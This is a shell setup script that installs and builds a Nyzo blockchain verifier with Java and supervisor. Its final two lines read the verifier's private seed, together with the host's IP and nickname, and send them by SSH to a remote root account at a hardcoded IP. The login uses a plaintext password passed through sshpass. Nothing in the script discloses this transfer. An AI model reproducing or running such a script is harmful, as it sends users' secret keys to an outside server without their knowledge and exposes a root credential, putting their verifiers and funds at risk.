#!/bin/sh
sudo su
sudo apt install haveged -y
sudo apt install openjdk-8-jdk -y
sudo apt install supervisor -y
cd /home/ubuntu/nyzoVerifier
sudo ./gradlew build
sudo mkdir -p /var/lib/nyzo/production
sudo cp trusted_entry_points /var/lib/nyzo/production
sudo cp nyzoVerifier.conf /etc/supervisor/conf.d
sudo bash -c 'echo BAAW$(($RANDOM%82+6)) > /var/lib/nyzo/production/nickname'
sudo supervisorctl reload
sleep 20s
sudo renice -n -5 -p $(pgrep ^java$)
echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/managed_verifiers'
echo $(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/file1'
